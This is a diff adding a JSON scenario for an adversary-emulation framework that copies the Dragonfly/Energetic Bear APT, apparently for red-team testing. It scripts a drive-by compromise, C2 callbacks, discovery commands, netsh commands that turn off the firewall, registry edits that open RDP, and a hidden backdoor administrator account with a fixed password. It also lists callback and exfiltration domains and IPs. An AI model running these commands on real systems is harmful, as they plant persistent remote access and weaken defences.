@@ -1,0 +1,951 @@
+{
+    "meta_data": {
+        "name": "dragonfly",
+        "version": "v1.0.1",
+        "title": "Dragonfly Inspired Scenario 1",
+        "description": "An automated attack meant to emulate an APT actor with the common names Dragonfly, TEMP.Isotope, DYMALLOY, Berserk Bear, TG-4192, Crouching Yeti, IRON LIBERTY, and Energetic Bear. The attack enables future attacks by allowing remote access to the host.",
+        "author": "Attack Content",
+        "suggested_duration": 2295
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "ValidAccounts_DomainAccounts",
+            "technique": "PrivilegeEscalation",
+            "label": "validAccounts_DomainAccounts_t1",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1_low",
+                "tool": "self.tool",
+                "target_1": "self.target_1_low",
+                "target_2": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1_elevated",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "systeminfo"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmdkey /list"
+                }
+            }
+        },
+        {
+            "tactic": "ProcessDiscovery",
+            "technique": "Discovery",
+            "label": "processDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "tasklist /v"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConnectionsDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConnectionsDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netstat -nao"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netstat -rn"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "ipconfig /all"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_4",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "arp -a"
+                }
+            }
+        },
+        {
+            "tactic": "NetworkShareDiscovery",
+            "technique": "Discovery",
+            "label": "networkShareDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net share"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConnectionsDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConnectionsDiscovery_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net use"
+                }
+            }
+        },
+        {
+            "tactic": "SystemOwnerUserDiscovery",
+            "technique": "Discovery",
+            "label": "systemOwnerUserDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net user %username%"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainAccount_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net user %username% /domain"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c set"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainAccount_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c dir %systemdrive%\\Users\\*.*"
+                }
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "fileAndDirectoryDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c dir %appdata%\\Microsoft\\Windows\\Recent\\*.*"
+                }
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "fileAndDirectoryDiscovery_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c dir %userprofile%\\Desktop\\*.*"
+                }
+            }
+        },
+        {
+            "tactic": "SecuritySoftwareDiscovery",
+            "technique": "Discovery",
+            "label": "securitySoftwareDiscovery_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{ls ${$env:ProgramFiles(x86)}}"
+                }
+            }
+        },
+        {
+            "tactic": "SecuritySoftwareDiscovery",
+            "technique": "Discovery",
+            "label": "securitySoftwareDiscovery_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{ls ${$env:ProgramFiles}}"
+                }
+            }
+        },
+        {
+            "tactic": "SecuritySoftwareDiscovery",
+            "technique": "Discovery",
+            "label": "securitySoftwareDiscovery_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c dir %appdata% "
+                }
+            }
+        },
+        {
+            "tactic": "SystemOwnerUserDiscovery",
+            "technique": "Discovery",
+            "label": "systemOwnerUserDiscovery_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "whoami /all"
+                }
+            }
+        },
+        {
+            "tactic": "DisableOrModifySystemFirewall",
+            "technique": "DefenseEvasion",
+            "label": "disableOrModifySystemFirewall_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netsh firewall set opmode disable"
+                }
+            }
+        },
+        {
+            "tactic": "DisableOrModifySystemFirewall",
+            "technique": "DefenseEvasion",
+            "label": "disableOrModifySystemFirewall_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netsh advfirewall set allprofiles state off"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\"; New-Item -Path $path -force; New-ItemProperty -path $path -name 3389:TCP -PropertyType String -value \"\"\"3389:TCP:*:Enabled:Remote Desktop\"\"\" -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\"; New-Item -Path $path -force; New-ItemProperty -path $path -name 3389:TCP -PropertyType String -value \"3389:TCP:*:Enabled:Remote Desktop\" -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"; New-Item -Path $path -force; New-ItemProperty -path $path -name fDenyTSConnections -PropertyType DWORD -value 0 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_4",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"; New-Item -Path $path -force; New-ItemProperty -path $path -name fSingleSessionPerUser -PropertyType DWORD -value 0 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_5",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\"; New-Item -Path $path -force; New-ItemProperty -path $path -name EnableConcurrentSessions -PropertyType DWORD -value 1 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_6",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"; New-Item -Path $path -force; New-ItemProperty -path $path -name EnableConcurrentSessions -PropertyType DWORD -value 1 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_7",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"; New-Item -Path $path -force; New-ItemProperty -path $path -name AllowMultipleTSSessions -PropertyType DWORD -value 1 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_8",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; New-Item -Path $path -force; New-ItemProperty -path $path -name MaxInstanceCount -PropertyType DWORD -value 100 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "CreateAccount_LocalAccount",
+            "technique": "Persistence",
+            "label": "createAccount_LocalAccount_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net user MS_BACKUP P@55w0Rd1337 /add /Y"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net localgroup Administrators /add MS_BACKUP"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net localgroup Administradores /add MS_BACKUP"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net localgroup Amministratori /add MS_BACKUP"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_4",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net localgroup Administratoren /add MS_BACKUP"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_5",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net localgroup Administrateurs /add MS_BACKUP"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_6",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net localgroup \"Remote Desktop Users\" /add MS_BACKUP"
+                }
+            }
+        },
+        {
+            "tactic": "AccountManipulation",
+            "technique": "Persistence",
+            "label": "accountManipulation_7",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net user MS_BACKUP /expires:never"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_9",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"; New-Item -Path $path -force; New-ItemProperty -path $path -name MS_BACKUP -PropertyType DWORD -value 0 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_A",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\"; New-Item -Path $path -force; New-ItemProperty -path $path -name dontdisplaylastusername -PropertyType DWORD -value 1 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "ModifyRegistry",
+            "technique": "DefenseEvasion",
+            "label": "modifyRegistry_B",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$path = \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\"; New-Item -Path $path -force; New-ItemProperty -path $path -name LocalAccountTokenFilterPolicy -PropertyType DWORD -value 1 -force}"
+                }
+            }
+        },
+        {
+            "tactic": "WindowsService",
+            "technique": "Persistence",
+            "label": "windowsService_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "sc config termservice start= auto"
+                }
+            }
+        },
+        {
+            "tactic": "ServiceExecution",
+            "technique": "Execution",
+            "label": "serviceExecution_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net start termservice"
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit_Low",
+            "preconditions": {
+                "agent": "self.agent_tgt1_low",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "blog.olioboard.com",
+            "www.manshur.ir",
+            "realstars.ir",
+            "aptguide.3dtour.com ",
+            "seductionservice.com",
+            "mahsms.ir",
+            "keeleux.com",
+            "vr-bangers.com",
+            "ecco0.b13x.org",
+            "smarttoys.com.ua",
+            "kanri.rbridal.net",
+            "satanal.info",
+            "tureg.info",
+            "doublestats.online"
+        ],
+        "ip": [
+            "91.203.6.71/24",
+            "93.171.216.118/24",
+            "93.188.161.235/24",
+            "103.41.177.69/24",
+            "37.1.202.26/24",
+            "184.154.150.66/24",
+            "188.42.223.39/24",
+            "185.103.110.210/24",
+            "5.135.104.77/24",
+            "62.8.193.206/24"
+        ],
+        "binary": [
+            "SearchIndexer.exe",
+            "ImeBroker.exe",
+            "fsutil.exe",
+            "PnPutil.exe",
+            "BdeUISrv.exe",
+            "WinSAT.exe",
+            "pwNative.exe",
+            "SnippingTool.exe",
+            "DFDWizard.exe",
+            "PrintBrmEngine.exe",
+            "WbemMonitor.exe",
+            "dxpserver.exe",
+            "PowerMng.exe"
+        ],
+        "temp_file": [
+            {
+                "template": [
+                    "c:\\microsoft\\windows\\",
+                    {
+                        "kind": "call",
+                        "func": {
+                            "kind": "attribute",
+                            "attr": "join",
+                            "value": ""
+                        },
+                        "args": [
+                            {
+                                "kind": "comprehension",
+                                "element": {
+                                    "kind": "call",
+                                    "func": {
+                                        "kind": "name",
+                                        "id": "choice"
+                                    },
+                                    "args": [
+                                        {
+                                            "kind": "bin op",
+                                            "op": "add",
+                                            "left": {
+                                                "kind": "attribute",
+                                                "attr": "ascii_uppercase",
+                                                "value": {
+                                                    "kind": "name",
+                                                    "id": "string"
+                                                }
+                                            },
+                                            "right": {
+                                                "kind": "attribute",
+                                                "attr": "digits",
+                                                "value": {
+                                                    "kind": "name",
+                                                    "id": "string"
+                                                }
+                                            }
+                                        }
+                                    ]
+                                },
+                                "generators": [
+                                    {
+                                        "iter": {
+                                            "kind": "call",
+                                            "func": {
+                                                "kind": "name",
+                                                "id": "range"
+                                            },
+                                            "args": [
+                                                10
+                                            ]
+                                        },
+                                        "target": {
+                                            "kind": "name",
+                                            "id": "_"
+                                        }
+                                    }
+                                ]
+                            }
+                        ]
+                    },
+                    ".tmp"
+                ]
+            }
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "50",
+                "ioc-ip_callback": "185.162.8.12/24",
+                "ioc-domain_callback": "hotspot.accesscam.org",
+                "ioc-binary_payload_name": "outllib.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "91.134.132.40/24",
+                "ioc-domain_exfil": "highcolumn.webredirect.org"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "87.236.16.254/24",
+                "ioc-domain_driveby": "ethdns.mywire.org"
+            }
+        },
+        "targets": {
+            "1": {
+                "ioc-temp_file_exfil": "c:\\microsoft\\windows\\M05B0s9AC2.tmp",
+                "payload_destination": "c:\\users\\Public"
+            },
+            "2": {
+                "payload_destination": "c:\\users\\Public"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_low": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_temp_file": {
+                "path": [
+                    "targets",
+                    "1",
+                    "ioc-temp_file_exfil"
+                ]
+            },
+            "exfil_domain": {
+                "path": [
+                    "exfil",
+                    "1",
+                    "ioc-domain_exfil"
+                ]
+            },
+            "target_2": {
+                "path": [
+                    "targets",
+                    "2"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1_low": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1_elevated",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
